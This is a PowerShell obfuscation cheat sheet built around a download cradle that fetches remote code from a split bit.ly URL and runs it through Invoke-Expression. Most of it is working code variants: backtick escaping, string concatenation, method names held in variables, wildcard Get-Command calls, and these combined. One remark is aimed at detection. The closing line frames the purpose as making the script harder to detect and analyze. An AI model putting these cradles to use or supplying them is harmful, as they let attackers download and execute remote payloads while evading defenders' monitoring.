### Obfuscating the Cradle

#### Example Script
```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('ht' + 'tps://bit.ly/L3g1t')
```

#### Key Script Block Elements
- **Invoke-Expression**
- **New-Object**
- **Net.WebClient**
- **.DownloadString**

#### Variations and Obfuscation Techniques

1. **Variable Assignment for WebClient**
   ```powershell
   $wc = New-Object Net.WebClient
   $wc.DownloadString('ht' + 'tps://bit.ly/L3g1t')
   ```

2. **Member Token Obfuscation**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient).'DownloadString'('ht' + 'tps://bit.ly/L3g1t')
   ```

3. **Using Single Quotes**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient).'DownloadString'('ht' + 'tps://bit.ly/L3g1t')
   ```

4. **Using Double Quotes**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient)."DownloadString"('ht' + 'tps://bit.ly/L3g1t')
   ```

5. **Using Tick Marks**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient)."Down`loadString"('ht' + 'tps://bit.ly/L3g1t')
   ```

6. **Escaping Characters**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"('ht' + 'tps://bit.ly/L3g1t')
   ```

7. **Fully Escaped Method Name**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht' + 'tps://bit.ly/L3g1t')
   ```

8. **Alternative WebClient Methods**
   - **.DownloadFile**
   - **.DownloadData**
   - **.OpenRead**
   - **.OpenReadAsync**
   - **.OpenReadTaskAsync**

9. **Using .Invoke on DownloadString (PS2.0)**
   ```powershell
   Invoke-Expression (New-Object Net.WebClient).("Down" + "loadString").Invoke('ht' + 'tps://bit.ly/L3g1t')
   ```

10. **Assigning Method to a Variable**
    ```powershell
    $ds = "Down" + "loadString"
    Invoke-Expression (New-Object Net.WebClient).$ds.Invoke('ht' + 'tps://bit.ly/L3g1t')
    ```

11. **Obfuscating New-Object**
    - **Option 1:**
      ```powershell
      (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")
      ```
    - **Option 2:**
      ```powershell
      (New-Object ("Net" + ".Web" + "Client"))
      ```
    - **Option 3:**
      ```powershell
      $var1 = "Net."
      $var2 = "WebClient"
      (New-Object $var1 + $var2)
      ```

12. **Combining Techniques**
    ```powershell
    Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('ht' + 'tps://bit.ly/L3g1t')
    ```

#### Additional Considerations
- **No Aliases for New-Object**: Since there are no aliases for the `New-Object` cmdlet, it is generally safe to trigger on this.
- **Get-Command**: Use `Get-Command` to find available functions and cmdlets.
  - **Example:**
    ```powershell
    & (Get-Command New-Object)
    . (Get-Command New-Object)
    ```
- **Wildcards with Get-Command**:
  - **Example:**
    ```powershell
    & (Get-Command New-Obj*)
    . (Get-Command New-Obj*)
    ```

By using these techniques, you can obfuscate the script to make it more difficult to detect and analyze.